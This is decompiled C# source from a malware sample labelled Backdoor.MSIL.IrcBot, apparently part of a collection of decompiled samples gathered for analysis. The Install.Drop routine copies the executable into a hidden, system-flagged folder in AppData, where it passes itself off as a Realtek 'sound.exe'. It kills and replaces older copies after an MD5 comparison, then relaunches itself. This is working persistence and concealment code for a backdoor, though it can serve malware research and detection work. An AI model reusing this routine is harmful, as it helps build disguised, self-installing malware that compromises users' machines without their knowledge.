// Decompiled with JetBrains decompiler
// Type: Realtek.Install
// Assembly: Realtek, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D76B5F46-2334-4413-9FB7-17692F948558
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.MSIL.IrcBot.u-ef0b787b17c95db8b20bb6d9cfcd867d72ab60807c74c3ee2df2c4e0e509958f.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;

namespace Realtek
{
  public class Install
  {
    public static void Drop()
    {
      string path2 = "sound.exe";
      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Realtek";
      string str2 = Path.Combine(str1, path2);
      if (!(Environment.CurrentDirectory != str1))
        return;
      string str3 = Install.MD5Hash(Process.GetCurrentProcess().MainModule.FileName);
      if (File.Exists(str2))
      {
        if (Install.MD5Hash(str2) != str3)
        {
          try
          {
            Process[] processes = Process.GetProcesses();
            try
            {
              foreach (Process process in processes)
              {
                if (process.MainModule.FileName == str2)
                  process.Kill();
              }
            }
            catch
            {
            }
            File.SetAttributes(str2, FileAttributes.Normal);
            File.Delete(str2);
            File.Copy(Process.GetCurrentProcess().MainModule.FileName, str2);
            File.SetAttributes(str2, File.GetAttributes(str2) | FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.ReadOnly);
            Process.Start(new ProcessStartInfo(str2)
            {
              WorkingDirectory = str1
            });
            Environment.Exit(0);
          }
          catch
          {
          }
        }
        else
        {
          Process.Start(new ProcessStartInfo(str2)
          {
            WorkingDirectory = str1
          });
          Environment.Exit(0);
        }
      }
      else
      {
        try
        {
          if (!Directory.Exists(str1))
          {
            Directory.CreateDirectory(str1);
            File.SetAttributes(str1, File.GetAttributes(str1) | FileAttributes.System | FileAttributes.Hidden);
          }
          File.Copy(Process.GetCurrentProcess().MainModule.FileName, str2);
          Process.Start(new ProcessStartInfo(str2)
          {
            WorkingDirectory = str1
          });
          Environment.Exit(0);
        }
        catch
        {
        }
      }
    }

    public static string MD5Hash(string sFilePath)
    {
      string str;
      try
      {
        MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
        FileStream inputStream = new FileStream(sFilePath, FileMode.Open, FileAccess.Read);
        byte[] hash = cryptoServiceProvider.ComputeHash((Stream) inputStream);
        inputStream.Close();
        str = BitConverter.ToString(hash);
      }
      catch (Exception ex)
      {
        throw ex;
      }
      return str;
    }
  }
}
